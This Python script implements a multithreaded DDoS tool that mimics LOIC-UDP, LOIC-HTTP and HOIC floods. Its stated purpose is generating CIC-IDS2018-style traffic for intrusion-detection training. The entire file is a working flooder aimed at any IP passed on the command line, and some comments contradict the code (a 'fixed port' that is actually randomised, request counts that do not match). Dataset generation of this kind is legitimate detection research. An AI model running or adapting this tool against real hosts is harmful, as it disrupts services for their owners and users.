"""
DDoS Attack - Distributed Denial of Service
Replicates CIC-IDS2018 DDoS attack tool behaviors:
  - LOIC-HTTP:  High-volume HTTP GET flood (many requests per persistent connection)
  - LOIC-UDP:   High-volume UDP flood to a FIXED port (all packets in same flow)
  - HOIC:       HTTP POST flood with large payloads (boosted LOIC variant)

Key differences from DoS: higher volume, more threads, and UDP flooding.
CICFlowMeter must see flows with very high packet counts and byte volumes.
"""

import socket
import threading
import time
import random
import string

# TCP receive buffer sizes → Init Fwd Win Byts feature.
# Values derived from CICIDS2018 training data analysis.
# SO_RCVBUF set BEFORE connect() controls TCP SYN window size.
_RCVBUF_LOIC_HTTP = 8192     # Training mode: 8192 (56.8% of TCP flows) ✓
_RCVBUF_HOIC = 8192          # Training mode: 8192 (56.8% of TCP flows) ✓

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/17.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile",
]


def _random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


class DDoSAttack:
    def __init__(self, target_ip, target_port=80, duration=60):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.running = True
        self.packet_count = 0
        self.lock = threading.Lock()

    def _inc_count(self, n=1):
        with self.lock:
            self.packet_count += n

    # ──────────────────────────────────────────────────────
    # LOIC-UDP — High-volume UDP flood to a FIXED port
    #   All packets to the SAME dst_port so CICFlowMeter groups
    #   them into ONE flow with extremely high packet count.
    #   Creates flows with: very high Tot Fwd Pkts, high
    #   TotLen Fwd Pkts, very low Flow IAT, Protocol=17 (UDP).
    # ──────────────────────────────────────────────────────
    def udp_flood(self):
        """LOIC-UDP: Flood target with UDP packets at high rate.
        VARIATION: Random destination ports to avoid single-flow grouping."""
        end_time = time.time() + self.duration
        udp_ports = [53, 123, 161, 514, 1900, 5353, 19132]
        payload_sizes = [512, 1024, 1400]

        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(1)
                
                # EXTREME: Send 500-2000 packets per flow (10x increase from current 50-200)
                num_packets = random.randint(500, 2000)
                port = random.choice(udp_ports)
                
                for _ in range(num_packets):
                    payload_size = random.choice(payload_sizes)
                    data = random.randbytes(payload_size) if hasattr(random, 'randbytes') else bytes(random.getrandbits(8) for _ in range(payload_size))
                    try:
                        sock.sendto(data, (self.target_ip, port))
                        self._inc_count()
                    except Exception:
                        break
                    # No delay - maximum UDP flood rate
                    time.sleep(random.uniform(0.00001, 0.0001))
                
                sock.close()
            except Exception:
                pass

    # ──────────────────────────────────────────────────────
    # LOIC-HTTP — High-volume HTTP GET flood over keep-alive
    #   Creates flows with: very high Tot Fwd Pkts, very high
    #   Flow Pkts/s, high TotLen Fwd Pkts, many PSH flags.
    # ──────────────────────────────────────────────────────
    def http_flood(self):
        """LOIC-HTTP: Rapid HTTP GET requests, multiple connections to different ports.
        VARIATION: Variable ports and request counts per connection."""
        end_time = time.time() + self.duration
        http_ports = [80, 8080, 8888, 3000, 5000, 443]

        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_LOIC_HTTP)
                
                # VARIATION: Random HTTP port
                attack_port = random.choice(http_ports)
                sock.connect((self.target_ip, attack_port))

                # INCREASED: 100-300 requests per connection (was 1-5)
                for _ in range(random.randint(1000, 3000)):
                    if not self.running or time.time() >= end_time:
                        break

                    path = f"/{_random_string(random.randint(6, 12))}?{_random_string(4)}={_random_string(8)}"
                    req = (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}:{attack_port}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        f"Accept: */*\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                    )
                    sock.sendall(req.encode())
                    self._inc_count()

                    # Drain response briefly
                    try:
                        sock.settimeout(0.005)
                        sock.recv(8192)
                    except socket.timeout:
                        pass
                    sock.settimeout(10)
                    
                    # No delay - maximum request rate
                    time.sleep(random.uniform(0.0001, 0.0005))

                sock.close()
            except Exception:
                pass

    # ──────────────────────────────────────────────────────
    # HOIC — HTTP POST flood, NEW connection per 1-2 requests
    #
    # CICIDS2018 training data profile:
    #   Tot Fwd Pkts:    mean=2.5, median=2.5
    #   TotLen Fwd Pkts: mean=149.4, median=36.5
    #   Fwd Seg Size Min: 20 (no timestamps in HOIC tool)
    #   Init Fwd Win Byts: median=49136
    #   Flow Duration:   very short (~17ms)
    #   Dst Port: 80
    #
    # CRITICAL: Training shows very short connections (2.5 pkts).
    # ──────────────────────────────────────────────────────
    def hoic_flood(self):
        """HOIC: HTTP POST flood with large payloads, NEW connection per 1-2 requests.
        VARIATION: Random ports and body sizes for realistic attack pattern."""
        end_time = time.time() + self.duration
        http_ports = [80, 8080, 8888, 3000, 5000, 443]

        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HOIC)
                
                # VARIATION: Random HTTP port
                attack_port = random.choice(http_ports)
                sock.connect((self.target_ip, attack_port))

                # Send 500-1000 POST requests per connection (10x increase from 50-100)
                requests_this_conn = random.randint(500, 1000)
                for _ in range(requests_this_conn):
                    if not self.running or time.time() >= end_time:
                        break

                    # VARIATION: Variable body size (500-12000 bytes for diversity)
                    body_size = random.randint(500, 12000)
                    body = _random_string(body_size)
                    path = f"/{_random_string(random.randint(5, 12))}"
                    req = (
                        f"POST {path} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}:{attack_port}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        f"Content-Type: application/x-www-form-urlencoded\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"Accept: */*\r\n"
                        f"Connection: close\r\n"
                        f"\r\n"
                        f"{body}"
                    )
                    sock.sendall(req.encode())
                    self._inc_count()

                    # Drain response
                    try:
                        sock.settimeout(0.1)
                        sock.recv(8192)
                    except socket.timeout:
                        pass
                    
                    # No delay - maximum request rate
                    time.sleep(random.uniform(0.0001, 0.0005))

                sock.close()
            except Exception:
                pass

    def run_attack(self, num_threads=1):
        """Run DDoS attack with multiple threads."""
        print(f"[DDoS] Starting attack on {self.target_ip}:{self.target_port} for {self.duration}s")
        print(f"[DDoS] Techniques: LOIC-HTTP + LOIC-UDP + HOIC")
        print(f"[DDoS] Using {num_threads} threads (throttled from 10 to reduce flow rate)")

        techniques = [
            self.udp_flood,
            self.http_flood,
            self.hoic_flood,
        ]

        threads = []
        for i in range(num_threads):
            technique = techniques[i % len(techniques)]
            t = threading.Thread(target=technique, name=f"DDoS-{technique.__name__}-{i}")
            t.daemon = True
            t.start()
            threads.append(t)

        start_time = time.time()
        for t in threads:
            remaining = max(1, self.duration - (time.time() - start_time) + 5)
            t.join(timeout=remaining)

        self.running = False
        elapsed = time.time() - start_time
        print(f"[DDoS] Attack completed in {elapsed:.2f}s — Sent {self.packet_count} packets")


def run_ddos(target_ip, target_port=80, duration=60, threads=10):
    """Convenience function to run DDoS attack"""
    attack = DDoSAttack(target_ip, target_port, duration)
    attack.run_attack(num_threads=threads)


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        target_ip = sys.argv[1]
        duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
        run_ddos(target_ip, duration=duration)
    else:
        print("Usage: python _2_ddos_simulation.py <target_ip> [duration]")
